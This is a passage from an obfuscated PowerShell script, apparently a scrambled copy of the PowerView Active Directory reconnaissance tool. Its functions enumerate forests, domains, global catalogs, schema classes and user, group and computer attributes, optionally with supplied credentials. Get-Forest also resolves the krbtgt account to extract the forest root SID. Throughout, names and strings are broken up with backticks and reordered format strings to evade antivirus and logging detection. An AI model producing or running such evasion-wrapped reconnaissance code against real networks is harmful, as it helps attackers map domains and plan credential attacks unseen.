        [Alias({"{2}{3}{1}{0}"-f 'ler','l','DomainCo','ntro'})]
        [String]
        ${SE`R`VEr},

        [Switch]
        ${l`DAp},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREDEnT`i`Al} =  (  Item ('Var'+'i'+'aBlE:'+'7tq02')  )."Va`LUe"::"EM`Pty",

        [Switch]
        ${s`sL}
    )

    PROCESS {
        ${A`RGUmE`NTs} = @{}
        if (${Ps`BoUn`dpAr`AM`EteRS}[("{0}{2}{1}"-f 'D','n','omai')]) { ${Argu`mEN`TS}[("{0}{1}"-f 'Do','main')] = ${do`m`AIn} }
        if (${psBO`U`NdPARAMET`e`RS}[("{1}{0}{2}{3}" -f 'red','C','entia','l')]) { ${A`RgUm`Ents}[("{1}{0}{2}"-f 'nt','Crede','ial')] = ${c`RED`EntIAL} }
        if (${P`sb`OUn`dPARAmETE`Rs}['SSL']) { ${A`RgU`mEntS}['SSL'] = ${s`Sl} }

        if (${pSBoUNDP`ARa`m`ETeRs}[("{0}{1}" -f'L','DAP')] -or ${PsbO`UNdP`A`Ra`MetE`RS}[("{1}{0}"-f 'rver','Se')]) {
            if (${psbOU`N`d`paRaM`eTE`Rs}[("{1}{0}"-f 'rver','Se')]) { ${ar`g`UmEnTs}[("{1}{0}" -f'er','Serv')] = ${sEr`VeR} }

            
            ${aRGu`M`ENTs}[("{2}{1}{3}{0}"-f'r','APFi','LD','lte')] = (("{5}{3}{0}{4}{8}{7}{10}{13}{9}{12}{2}{6}{11}{1}"-f'ccou',':=8192)','6','A','ntCon','(user','.1.4.8',':1.','trol','135','2.840.','03','5','1'))

            &("{3}{2}{1}{0}{4}" -f 'e','ut','omainComp','Get-D','r') @Arguments
        }
        else {
            ${fo`UNd`Do`main} = &("{1}{0}{2}"-f'-Do','Get','main') @Arguments
            if (${f`OUNdd`oMaIn}) {
                ${f`OuNDdo`M`AIn}."d`omA`iNCO`NTrOlLE`Rs"
            }
        }
    }
}


function get-`FO`ReST {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{0}{3}{4}"-f'r','PSShoul','dP','oc','ess'}, '')]
    [OutputType({"{0}{6}{3}{4}{5}{2}{7}{8}{1}" -f 'S','ject','ation','stem.Manageme','nt.Au','tom','y','.P','SCustomOb'})]
    [CmdletBinding()]
    Param(
        [Parameter(POSiTIon = 0, vAluefroMPIPElinE = ${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`oR`eST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`EdENt`iAL} =   ( gET-vARiABLe  ('7TQ'+'02') )."va`LUE"::"e`mpTY"
    )

    PROCESS {
        if (${PSb`O`Un`DpARAmeT`erS}[("{2}{1}{0}"-f'ntial','e','Cred')]) {

            &("{0}{1}{2}"-f'W','r','ite-Verbose') ("{13}{5}{12}{1}{2}{7}{10}{9}{8}{0}{6}{4}{11}{3}"-f'ntials','orest]',' U','orest','r Ge','Get',' fo','s','de','e','ing alternate cr','t-F','-F','[')

            if (${Psb`OU`NdP`ARamETErs}[("{1}{0}" -f'rest','Fo')]) {
                ${TArg`eT`ForEst} = ${fO`REST}
            }
            else {
                
                ${TARGEtfo`RE`ST} = ${cReDe`NTI`AL}.("{1}{3}{2}{0}" -f'l','G','NetworkCredentia','et').Invoke()."Doma`iN"
                &("{1}{2}{0}" -f'e','W','rite-Verbos') ('['+'Get-Fo'+'rest'+'] '+'Extr'+'acted'+' '+'do'+'mai'+'n '+"'$Forest' "+'from'+' '+'-Cr'+'edentia'+'l')
            }

            ${FOre`sTco`NText} = &("{3}{0}{1}{2}"-f 'ew-Obje','c','t','N') ("{1}{9}{4}{2}{8}{5}{10}{7}{3}{0}{6}"-f 'ryC','Sys','ctoryS','Directo','e','.Active','ontext','tory.','ervices','tem.Dir','Direc')(("{1}{0}"-f'rest','Fo'), ${t`A`RgetfO`Re`St}, ${cre`dENt`IAL}."USEr`NaME", ${cr`e`dEnT`IaL}.("{5}{0}{4}{2}{3}{1}"-f 'Netw','ntial','r','ede','orkC','Get').Invoke()."pA`SsW`OrD")

            try {
                ${F`orEs`ToB`JeCt} =  ${F`Bg}::("{1}{0}{2}"-f'ores','GetF','t').Invoke(${forESt`CO`N`T`ext})
            }
            catch {
                &("{0}{1}{2}"-f 'Wr','ite-Verbos','e') ('[Get'+'-'+'Forest] '+'T'+'he '+'sp'+'eci'+'fied '+'fo'+'res'+'t '+"'$TargetForest' "+'doe'+'s '+'no'+'t '+'e'+'xis'+'t, '+'could'+' '+'not'+' '+'be'+' '+'co'+'nt'+'acted, '+'th'+'ere '+('i'+'sn{'+'0}t ')  -F  [chAR]39+'a'+'n '+'e'+'xis'+'ting '+'tr'+'ust, '+'or'+' '+'th'+'e '+'spec'+'ifie'+'d '+'cre'+'d'+'entials'+' '+'are'+' '+'in'+'valid'+': '+"$_")
                ${N`Ull}
            }
        }
        elseif (${PsB`OuNdPa`Ra`mETERs}[("{0}{1}"-f'F','orest')]) {
            ${f`OrEstc`ont`Ext} = &("{1}{0}{2}"-f 'ew-Obj','N','ect') ("{6}{9}{7}{4}{11}{0}{5}{8}{1}{10}{2}{3}"-f'veDirec','r','yCon','text','ryService','tory','Sy','ecto','.Di','stem.Dir','ector','s.Acti')(("{1}{0}" -f'orest','F'), ${F`ORe`sT})
            try {
                ${fOR`E`sToB`jE`CT} =   (  Get-VAriabLe ("{0}{1}" -f'f','Bg')  )."Val`Ue"::("{1}{2}{0}" -f'st','Get','Fore').Invoke(${FO`Re`stconte`xt})
            }
            catch {
                &("{3}{1}{2}{0}"-f 'Verbose','te','-','Wri') ('[Get-F'+'o'+'rest]'+' '+'Th'+'e '+'s'+'p'+'eci'+'fied '+'fo'+'rest '+"'$Forest' "+'d'+'oes '+'no'+'t '+'ex'+'ist, '+'coul'+'d '+'not'+' '+'b'+'e '+'con'+'ta'+'cted,'+' '+'or'+' '+'the'+'re '+('isn{'+'0}t'+' ')-f  [cHaR]39+'an'+' '+'exis'+'ting'+' '+'trust:'+' '+"$_")
                return ${nu`LL}
            }
        }
        else {
            
            ${For`esTo`B`JE`Ct} =   (GEt-VarIABLe ("{1}{0}" -f 'Bg','F'))."vAl`UE"::("{2}{1}{0}{3}" -f 'rrent','u','GetC','Forest').Invoke()
        }

        if (${fo`ReS`ToB`J`EcT}) {
            
            if (${p`s`Bo`UndpAra`MeTErs}[("{0}{3}{2}{1}" -f'C','l','edentia','r')]) {
                ${FO`Re`STsId} = (&("{1}{0}{3}{2}" -f'oma','Get-D','User','in') -Identity ("{1}{0}"-f'gt','krbt') -Domain ${fOREs`T`oBJE`cT}."RO`oTDo`Ma`IN"."nA`me" -Credential ${cR`ede`Nt`IAl})."OBJ`ECtS`Id"
            }
            else {
                ${FoRe`S`Ts`ID} = (&("{2}{1}{0}"-f 'r','omainUse','Get-D') -Identity ("{1}{0}"-f'rbtgt','k') -Domain ${F`OrEsT`ObJ`eCt}."rOoTd`OMA`In"."Na`ME")."OB`jeCTs`iD"
            }

            ${P`AR`Ts} = ${Fo`R`E`stsID} -Split '-'
            ${f`oR`EST`SiD} = ${p`ArtS}[0..$(${p`AR`TS}."leng`Th"-2)] -join '-'
            ${ForESTO`Bj`ect} | &("{2}{0}{1}"-f 'dd-Memb','er','A') ("{2}{0}{1}" -f 'e','rty','NoteProp') ("{1}{0}{2}"-f'otDom','Ro','ainSid') ${fO`RE`sT`SiD}
            ${f`OrE`st`O`BjeCT}
        }
    }
}


function geT-FOr`ESt`dO`MA`in {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{4}{0}{2}{3}"-f'c','PSSho','e','ss','uldPro'}, '')]
    [OutputType({"{0}{5}{4}{6}{8}{1}{2}{7}{3}"-f 'Sy','rvices.Active','Directory.Doma','n','.Direct','stem','oryS','i','e'})]
    [CmdletBinding()]
    Param(
        [Parameter(poSITION = 0, vaLUEFROmpIPELIne = ${Tr`UE})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${F`O`RESt},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cReDE`Nt`IAL} =   (Get-vaRIabLe  ("{0}{1}"-f'7T','Q02') -vAlUE)::"eMP`Ty"
    )

    PROCESS {
        ${aRgu`men`Ts} = @{}
        if (${Ps`BOUN`d`p`AramE`TeRs}[("{0}{1}" -f'Fo','rest')]) { ${a`RGUm`eNTS}[("{0}{1}" -f 'Fore','st')] = ${foR`ESt} }
        if (${p`SBO`UNDPAr`AMeTeRS}[("{0}{1}{2}" -f'Cred','en','tial')]) { ${arGuM`e`Nts}[("{0}{2}{1}{3}" -f'Cr','de','e','ntial')] = ${c`R`EdeNtIal} }

        ${F`or`eST`oBjECt} = &("{2}{3}{0}{1}" -f're','st','Get','-Fo') @Arguments
        if (${F`oRes`T`oBJEct}) {
            ${fo`ReSto`BJEct}."DOmA`INS"
        }
    }
}


function GeT`-fOre`sT`gloBalC`At`AloG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{1}{3}{0}"-f 'Process','hou','PSS','ld'}, '')]
    [OutputType({"{3}{0}{10}{5}{11}{8}{9}{4}{7}{6}{1}{2}"-f'.Di','lo','g','System','y.G','oryServices.','ata','lobalC','tiveDirect','or','rect','Ac'})]
    [CmdletBinding()]
    Param(
        [Parameter(pOsItion = 0, vAluEfrOMPiPELine = ${TR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${FOR`esT},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${credeN`TI`Al} =  (  vArIAblE ('7Tq0'+'2') )."V`ALuE"::"e`MPTY"
    )

    PROCESS {
        ${Arg`U`MEnTs} = @{}
        if (${PS`B`o`UnDParAmeTERs}[("{0}{1}" -f 'Fore','st')]) { ${aRg`Umen`Ts}[("{0}{1}"-f 'For','est')] = ${FoR`est} }
        if (${P`sBoU`NdP`ARamE`Ters}[("{1}{2}{0}"-f'al','Crede','nti')]) { ${a`R`Gu`menTS}[("{1}{0}{2}" -f'en','Cred','tial')] = ${c`R`EdEntial} }

        ${fOrES`ToBjE`Ct} = &("{1}{0}{2}"-f 'Fo','Get-','rest') @Arguments

        if (${fo`RES`ToBJeCT}) {
            ${For`E`st`OB`JeCt}.("{1}{2}{0}{3}"-f'AllGl','Fi','nd','obalCatalogs').Invoke()
        }
    }
}


function Ge`T`-F`o`ReStSchem`ACLa`Ss {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{2}{1}"-f 'PSShoul','ess','Proc','d'}, '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(PositIon = 0, VaLUEfRomPiPELInE = ${T`RuE})]
        [Alias({"{1}{0}" -f'ass','Cl'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Clas`sN`A`ME},

        [Alias({"{1}{0}"-f 'me','Na'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${fOr`eST},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CReDe`N`TIAl} =   ${7tQ02}::"em`PTY"
    )

    PROCESS {
        ${ARGUm`eN`Ts} = @{}
        if (${PsBo`UNDP`Aram`EtERs}[("{1}{0}"-f'orest','F')]) { ${a`RGumE`N`Ts}[("{1}{2}{0}" -f 't','For','es')] = ${FoR`ESt} }
        if (${psB`OUnDP`Aramet`e`RS}[("{0}{3}{2}{1}"-f 'Cr','l','ia','edent')]) { ${ARG`UME`Nts}[("{1}{2}{0}{3}"-f 'ia','Crede','nt','l')] = ${c`R`eD`eNTIAL} }

        ${foRE`st`Ob`JeCt} = &("{1}{2}{0}"-f 'Forest','Get','-') @Arguments

        if (${F`ORE`sT`OBjecT}) {
            if (${PsbouNdpa`RamE`T`e`Rs}[("{2}{0}{1}" -f 'lassNam','e','C')]) {
                ForEach (${t`ArGET`c`LAss} in ${ClA`ssn`A`Me}) {
                    ${FoRes`T`oBJe`Ct}."s`cHeMA".("{1}{0}{2}"-f'las','FindC','s').Invoke(${tA`RGETcLA`Ss})
                }
            }
            else {
                ${F`ORE`S`TObJEct}."s`cHemA".("{0}{3}{2}{1}"-f 'FindAl','ses','as','lCl').Invoke()
            }
        }
    }
}


function fi`ND-DOMaInObJec`TprOp`E`R`T`YOUTlIeR {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{4}{1}{2}{3}"-f 'P','d','Proces','s','SShoul'}, '')]
    [OutputType({"{2}{0}{4}{7}{6}{1}{5}{3}" -f'iew','utl','PowerV','er','.Proper','i','O','ty'})]
    [CmdletBinding(dEFAuLTpaRAMeTersETName = {"{2}{1}{0}"-f'me','sNa','Clas'})]
    Param(
        [Parameter(PosiTIoN = 0, MaNDAtOry = ${t`RuE}, pARameteRsetnAMe = "CL`ASSNa`me")]
        [Alias({"{1}{0}" -f 's','Clas'})]
        [ValidateSet({"{1}{0}"-f'r','Use'}, {"{1}{0}" -f 'up','Gro'}, {"{1}{0}{2}"-f 'ompute','C','r'})]
        [String]
        ${cLAsS`NA`mE},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${reFere`NcEPrOP`ert`y`SeT},

        [Parameter(VALUEFrompIPelINe = ${tR`Ue}, ManDatoRY = ${t`RUE}, PaRAMetErSetnAme = "rEFE`RenceO`BJE`CT")]
        [PSCustomObject]
        ${reF`E`RE`NCeOb`Ject},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`MaIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}" -f'i','F','lter'})]
        [String]
        ${L`DAp`F`iLTer},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'ADSPat','h'})]
        [String]
        ${Se`Ar`cH`BaSe},

        [ValidateNotNullOrEmpty()]
        [Alias({"{3}{2}{0}{1}"-f 'ontroll','er','mainC','Do'})]
        [String]
        ${serv`eR},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{2}{1}{0}" -f 'Level','e','On'}, {"{1}{0}{2}" -f'btre','Su','e'})]
        [String]
        ${sE`Ar`ChSco`pE} = ("{0}{1}" -f'S','ubtree'),

        [ValidateRange(1, 10000)]
        [Int]
        ${r`ESul`TP`AgESIZE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${s`E`RVErTIMe`LI`MiT},

        [Switch]
        ${TombS`TO`Ne},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${Cr`e`de`NTIaL} =  ${7t`q02}::"E`mPty"
    )

    BEGIN {
        ${UsERR`EFErEnCePrO`Pe`RT`Y`seT} = @(("{2}{1}{0}" -f 't','incoun','adm'),("{2}{0}{1}{3}" -f 'counte','xpi','ac','res'),("{2}{0}{3}{1}" -f'd','ordtime','ba','passw'),("{2}{1}{0}{3}"-f'ou','pwdc','bad','nt'),'cn',("{2}{1}{0}"-f 'epage','od','c'),("{1}{0}{2}" -f'ount','c','rycode'),("{2}{0}{1}"-f 'tio','n','descrip'), ("{2}{1}{0}" -f 'ayname','spl','di'),("{3}{1}{2}{0}" -f'ame','e','dn','distinguish'),("{1}{2}{3}{0}{4}" -f'gati','dscorep','ro','pa','ondata'),("{0}{2}{1}"-f 'g','ame','ivenn'),("{2}{0}{1}" -f 'ns','tancetype','i'),("{2}{4}{0}{3}{1}" -f 'lsystemo','ect','is','bj','critica'),("{0}{2}{1}{3}"-f'lastl','gof','o','f'),("{1}{3}{2}{0}"-f'n','l','o','astlog'),("{1}{2}{3}{0}"-f 'imestamp','lastlo','gon','t'),("{0}{1}{2}"-f'loc','k','outtime'),("{0}{1}{2}"-f'log','o','ncount'),("{1}{0}{2}" -f 'bero','mem','f'),("{7}{5}{1}{2}{0}{6}{4}{3}"-f'n','portedencrypt','io','pes','y','ds-sup','t','ms'),("{1}{0}"-f 'me','na'),("{2}{1}{0}" -f'egory','ectcat','obj'),("{1}{2}{0}" -f'ss','obj','ectcla'),("{1}{3}{2}{0}"-f 'd','object','ui','g'),("{0}{1}"-f'ob','jectsid'),("{0}{2}{1}{3}"-f'p','ou','rimarygr','pid'),("{2}{0}{1}"-f 'e','t','pwdlasts'),("{1}{4}{2}{0}{3}" -f 'ntn','sa','ou','ame','macc'),("{1}{2}{3}{0}"-f 'nttype','s','amac','cou'),'sn',("{5}{1}{2}{4}{3}{0}"-f 'ol','sera','ccou','r','ntcont','u'),("{1}{3}{2}{0}" -f'me','userprinc','palna','i'),("{1}{0}{2}"-f's','u','nchanged'),("{1}{0}{2}" -f 'te','usncrea','d'),("{2}{3}{1}{0}"-f'ed','ang','wh','ench'),("{0}{3}{2}{1}" -f'wh','d','ate','encre'))

        ${G`Roup`REfeREnc`e`PR`OP`erT`YSeT} = @(("{2}{0}{3}{1}" -f'mincou','t','ad','n'),'cn',("{2}{0}{1}{3}" -f 'es','cripti','d','on'),("{0}{2}{1}{3}{5}{4}" -f 'd','ting','is','uishedna','e','m'),("{0}{2}{5}{3}{1}{4}"-f'd','ropagat','sc','rep','iondata','o'),("{0}{1}"-f'group','type'),("{1}{2}{3}{0}" -f'ancetype','i','n','st'),("{3}{1}{2}{0}{4}{6}{5}"-f'ste','s','y','iscritical','mob','t','jec'),("{1}{0}"-f'ber','mem'),("{1}{2}{0}" -f 'mberof','m','e'),("{1}{0}"-f'ame','n'),("{1}{0}{3}{2}" -f 'cat','object','y','egor'),("{1}{0}{2}" -f 'ectc','obj','lass'),("{0}{2}{1}" -f 'ob','id','jectgu'),("{0}{2}{1}"-f'o','d','bjectsi'),("{2}{0}{1}{4}{3}"-f 'acco','unt','sam','me','na'),("{2}{3}{1}{0}"-f 'e','yp','sam','accountt'),("{1}{0}{3}{2}" -f 's','sy','lags','temf'),("{2}{1}{0}"-f'nged','a','usnch'),("{2}{1}{0}"-f'ed','reat','usnc'),("{1}{2}{0}" -f 'anged','whenc','h'),("{1}{3}{0}{2}" -f 'crea','w','ted','hen'))

        ${CoMPu`Te`RrEfE`R`EN`CEPRo`PertY`sET} = @(("{3}{0}{2}{1}{4}"-f'nt','pi','ex','accou','res'),("{0}{1}{4}{2}{3}" -f 'b','a','dt','ime','dpasswor'),("{1}{3}{2}{0}" -f 't','badpwd','un','co'),'cn',("{0}{1}{2}" -f 'codepa','g','e'),("{1}{2}{3}{0}" -f 'e','c','ou','ntrycod'),("{3}{1}{2}{0}"-f'e','a','m','distinguishedn'),("{1}{0}{3}{2}"-f'nsho','d','me','stna'),("{3}{0}{1}{2}" -f'op','agationd','ata','dscorepr'),("{2}{0}{1}{3}"-f'nst','ancety','i','pe'),("{3}{1}{2}{4}{0}"-f 'ject','alsy','st','iscritic','emob'),("{2}{0}{1}" -f'of','f','lastlog'),("{1}{0}"-f 'logon','last'),("{5}{1}{0}{2}{4}{3}" -f 'g','tlo','ont','stamp','ime','las'),("{0}{2}{3}{1}"-f'loc','cyflags','a','lpoli'),("{1}{0}{2}" -f 'n','logo','count'),("{1}{4}{2}{5}{6}{0}{3}"-f'enc','msds-','port','ryptiontypes','sup','e','d'),("{0}{1}" -f'nam','e'),("{0}{4}{3}{1}{2}" -f 'objec','a','tegory','c','t'),("{1}{2}{0}"-f 's','objectc','las'),("{2}{1}{0}" -f'uid','jectg','ob'),("{1}{3}{0}{2}"-f 'ts','o','id','bjec'),("{1}{2}{0}" -f'ystem','op','eratings'),("{4}{0}{2}{1}{3}" -f'r','stem','atingsy','servicepack','ope'),("{2}{4}{5}{1}{3}{0}" -f 'n','emversi','oper','o','ating','syst'),("{3}{0}{1}{2}" -f 'r','oupi','d','primaryg'),("{2}{1}{0}" -f'et','wdlasts','p'),("{1}{3}{2}{0}"-f 'me','sa','tna','maccoun'),("{1}{3}{0}{2}"-f'accountt','s','ype','am'),("{5}{0}{3}{4}{2}{6}{1}" -f 'icepr','me','aln','inci','p','serv','a'),("{4}{0}{2}{1}{3}"-f 'accountcon','o','tr','l','user'),("{1}{0}{2}"-f'e','usnchang','d'),("{2}{0}{1}"-f 'ea','ted','usncr'),("{1}{2}{0}" -f'ed','w','henchang'),("{2}{1}{3}{0}" -f'd','n','whe','create'))

        ${S`earc`H`eraRGuM`ents} = @{}
        if (${PSBOUND`p`Ar`AmE`T`eRs}[("{0}{1}"-f'Doma','in')]) { ${s`ea`Rc`HErAr`Gum`ents}[("{1}{0}" -f'in','Doma')] = ${do`mA`In} }
        if (${PSbo`UN`D`pARamE`TerS}[("{1}{2}{0}"-f'ter','LDAPF','il')]) { ${seA`R`CHERArGUM`entS}[("{0}{2}{3}{1}"-f 'LD','r','APF','ilte')] = ${Ld`Ap`FILt`ER} }
        if (${p`SboU`N`DPaRa`me`TErS}[("{0}{1}{2}"-f 'Sea','rc','hBase')]) { ${SEARc`hE`R`ARG`UMe`NTS}[("{2}{1}{0}" -f'Base','rch','Sea')] = ${se`ARc`H`BAsE} }
        if (${ps`BOUn`D`par`Amete`RS}[("{0}{1}" -f'Se','rver')]) { ${SeaRCH`ErA`RgU`mEN`Ts}[("{1}{0}{2}" -f 'rve','Se','r')] = ${SER`VEr} }
        if (${PsB`oUnDP`A`Ra`MEtERs}[("{1}{0}{2}"-f'c','Sear','hScope')]) { ${sEa`R`cHEra`Rg`Ume`NTS}[("{2}{1}{0}"-f 'pe','o','SearchSc')] = ${s`EArcHSc`O`pE} }
        if (${psBOu`NdpA`R`A`meT`ERS}[("{2}{0}{3}{4}{1}" -f 'esult','ize','R','Page','S')]) { ${s`eaR`cheraRg`U`mEnTS}[("{3}{0}{2}{1}" -f 'esultP','eSize','ag','R')] = ${r`eSUL`TPAGESiZe} }
        if (${pSbO`UnDpA`RAmet`e`Rs}[("{0}{4}{1}{2}{3}"-f'Serv','e','Limi','t','erTim')]) { ${SeaR`c`hErA`RG`UmenTs}[("{0}{2}{1}{3}"-f'Se','verTimeLimi','r','t')] = ${seRvert`i`MELImiT} }
        if (${psB`ouN`dp`A`RaMeters}[("{2}{0}{1}" -f 'mbsto','ne','To')]) { ${s`e`ARCHera`RGu`mEnts}[("{0}{2}{1}"-f 'Tombs','e','ton')] = ${to`mbSTo`Ne} }
        if (${pSbO`U`NDpa`Ra`mETe`Rs}[("{1}{0}{2}"-f 'edentia','Cr','l')]) { ${SE`ArCHe`R`ARG`UME`NTs}[("{1}{3}{0}{2}" -f'ia','Crede','l','nt')] = ${cReDE`N`TIal} }

        
        if (${pSb`Oundp`A`RAMEtERS}[("{2}{1}{0}"-f 'in','a','Dom')]) {
            if (${P`SbOun`dPA`RameT`Ers}[("{0}{1}{3}{2}"-f 'C','rede','ial','nt')]) {
                ${TaRG`e`T`ForeSt} = &("{2}{0}{1}"-f 't-Dom','ain','Ge') -Domain ${d`Oma`in} | &("{0}{2}{3}{1}"-f 'Se','-Object','lec','t') -ExpandProperty ("{2}{1}{0}" -f 'est','or','F') | &("{1}{2}{0}{4}{3}" -f 'e','Select-Ob','j','t','c') -ExpandProperty ("{1}{0}" -f 'ame','N')
            }
            else {
                ${Ta`R`gE`TfORESt} = &("{3}{2}{1}{0}"-f'in','a','m','Get-Do') -Domain ${D`oMaiN} -Credential ${CrE`Den`Tial} | &("{0}{2}{1}" -f 'Se','bject','lect-O') -ExpandProperty ("{0}{1}" -f'Fores','t') | &("{1}{3}{2}{0}"-f 'ject','Sel','t-Ob','ec') -ExpandProperty ("{1}{0}"-f 'me','Na')
            }
            &("{0}{3}{1}{2}" -f 'W','te-Verbos','e','ri') ('['+'Find-Dom'+'ai'+'nObje'+'ctPropertyOutli'+'e'+'r]'+' '+'E'+'n'+'umerated '+'fore'+'s'+'t '+"'$TargetForest' "+'f'+'or '+'targ'+'et '+'d'+'om'+'ain '+"'$Domain'")
        }

        ${S`chEM`AaRGUm`ENTS} = @{}
        if (${Ps`B`Ou`NDpA`RAMeTeRS}[("{0}{2}{1}"-f'Cred','tial','en')]) { ${SChEmA`A`RGUME`N`Ts}[("{2}{0}{1}" -f'redentia','l','C')] = ${CReDE`NtI`Al} }
        if (${t`ArGET`F`orE`St}) {
            ${sC`heMAa`RguMEntS}[("{2}{1}{0}"-f'rest','o','F')] = ${targeTf`O`RE`sT}
        }
    }

    PROCESS {

        if (${psbO`U`ND`paRA`MeTeRS}[("{0}{1}{3}{5}{2}{4}" -f'Referen','ce','tySe','Prope','t','r')]) {
            &("{3}{2}{0}{1}" -f'o','se','erb','Write-V') ("{15}{21}{4}{20}{0}{3}{7}{8}{14}{19}{5}{13}{6}{16}{1}{18}{9}{10}{12}{2}{17}{11}" -f 'Pr','R','rop','ope','DomainOb','g ','ifi','rty','Outlier] Us','r','ence','Set','P','spec','i','[Fi','ed -','erty','efe','n','ject','nd-')
            ${reFEren`CEOBJ`Ectpr`Op`eRt`iEs} = ${refeR`enCepR`OPert`ySet}
        }
        elseif (${PsBoU`NDP`ARAmETe`RS}[("{1}{4}{2}{0}{3}" -f'eObje','Re','nc','ct','fere')]) {
            &("{1}{2}{0}"-f'Verbose','Wri','te-') ("{13}{8}{17}{4}{14}{3}{18}{11}{2}{7}{23}{22}{16}{10}{12}{0}{1}{9}{21}{19}{20}{6}{15}{5}"-f 'se as t','he',' property names f','roperty','e','y set','p','rom -','Find-D',' r','Object to ','tracting','u','[','ctP','ert','e','omainObj','Outlier] Ex','ren','ce pro','efe','renc','Refe')
            ${rEFeRE`NCEOBjeCT`PrOP`e`R`T`I`es} = &("{1}{2}{0}" -f'ber','Get-Me','m') -InputObject ${REfeREnC`EOb`Je`ct} -MemberType ("{3}{2}{0}{1}"-f'per','ty','ro','NoteP') | &("{2}{1}{0}" -f't','elect-Objec','S') -Expand ("{0}{1}" -f'Nam','e')
            ${rEFEREn`c`eo`Bj`EctclasS} = ${Refe`REnC`eobJ`e`Ct}."o`BJECTC`L`Ass" | &("{2}{3}{1}{0}"-f 'ject','b','Sel','ect-O') -Last 1
            &("{1}{2}{0}{3}" -f 'r','W','rite-Ve','bose') ('[Find-D'+'o'+'m'+'ain'+'Obj'+'ectPro'+'pertyOu'+'t'+'lier] '+'Calculat'+'ed'+' '+'Refe'+'renceOb'+'je'+'ctClass '+': '+"$ReferenceObjectClass")
        }
        else {
            &("{0}{2}{1}{3}" -f'Wr','erbos','ite-V','e') ('[F'+'i'+'nd-'+'Doma'+'inObjectPropertyO'+'utli'+'er] '+'U'+'si'+'ng '+'t'+'he '+'defa'+'u'+'lt '+'referenc'+'e'+' '+'pro'+'pert'+'y '+'set'+' '+'f'+'or '+'t'+'he '+'ob'+'je'+'ct '+'cl'+'ass '+"'$ClassName'")
        }

        if ((${cL`ASsnA`ME} -eq ("{0}{1}"-f'U','ser')) -or (${re`FErE`Nc`E`O`B`JECtcLaSS} -eq ("{0}{1}"-f 'Use','r'))) {
            ${o`BJe`CTS} = &("{1}{3}{2}{0}" -f'er','Get','s','-DomainU') @SearcherArguments
            if (-not ${rEfer`e`Nc`EobJEC`TPr`operTIEs}) {
                ${R`EFE`Ren`CEOB`JeCTPR`o`pEr`TieS} = ${US`Er`Re`F`E`RENCEpRo`peRtYSEt}
            }
        }
        elseif ((${c`LAS`snamE} -eq ("{0}{1}"-f'Grou','p')) -or (${R`EfER`e`N`c`EoBJectclA`SS} -eq ("{0}{1}" -f'Gr','oup'))) {
            ${O`BJ`EcTS} = &("{3}{1}{2}{0}" -f 'p','-','DomainGrou','Get') @SearcherArguments
            if (-not ${REFeR`E`N`C`EOBjeCtPRoPErT`I`eS}) {
                ${reFeRenCE`oBJEC`TPrOP`er`TiEs} = ${g`Rou`pREf`e`R`enCepRoP`ERtYSet}
            }
        }
        elseif ((${cLaSs`Na`me} -eq ("{1}{2}{0}"-f 'er','Com','put')) -or (${rEfERENcE`o`BjECtC`LaSS} -eq ("{1}{0}" -f 'er','Comput'))) {
            ${O`Bj`Ects} = &("{1}{3}{0}{2}{4}{5}" -f'omai','G','nC','et-D','om','puter') @SearcherArguments
            if (-not ${r`E`F`erENCE`obJEctpR`OPEr`Ti`ES}) {
                ${reFe`ReNc`eOBJ`ec`TpropertiEs} = ${Comp`Ute`RREfE`Ren`CE`pr`OPE`Rt`YSet}
            }
        }
        else {
            throw ('[Find-'+'DomainObj'+'ectP'+'roperty'+'Outlier]'+' '+'Inv'+'alid'+' '+'class:'+' '+"$ClassName")
        }

        ForEach (${oB`J`EcT} in ${Ob`jECtS}) {
            ${OB`JeC`TP`RoPer`Ties} = &("{1}{2}{0}"-f'ber','G','et-Mem') -InputObject ${oB`JECT} -MemberType ("{0}{2}{1}{3}" -f'NoteP','t','roper','y') | &("{1}{2}{0}"-f'ject','S','elect-Ob') -Expand ("{0}{1}"-f'Nam','e')
            ForEach(${OBJeCT`PRo`pE`RtY} in ${O`BjeCtprOpe`RT`I`eS}) {
                if (${rEfEr`e`N`C`e`ObJeCt`prOpeRt`iES} -NotContains ${ob`je`C`TPRoPE`Rty}) {
                    ${O`Ut} = &("{1}{2}{3}{0}" -f 'bject','New','-','O') ("{1}{2}{0}"-f 'ject','PSO','b')
                    ${O`UT} | &("{2}{0}{1}"-f'be','r','Add-Mem') ("{0}{3}{1}{2}"-f'Notepro','ert','y','p') ("{1}{2}{0}"-f'AccountName','S','am') ${obj`E`Ct}."Sa`maC`Co`UN`TnaMe"
                    ${O`UT} | &("{1}{0}{2}"-f 'd-','Ad','Member') ("{1}{3}{0}{2}" -f 'rop','Note','erty','p') ("{1}{0}"-f 'ty','Proper') ${obJECT`p`RopER`TY}
                    ${O`Ut} | &("{1}{2}{0}"-f'mber','Add-M','e') ("{0}{2}{1}" -f'N','roperty','otep') ("{0}{1}"-f'Valu','e') ${O`BjEcT}.${oBj`EcTPr`OPEr`Ty}
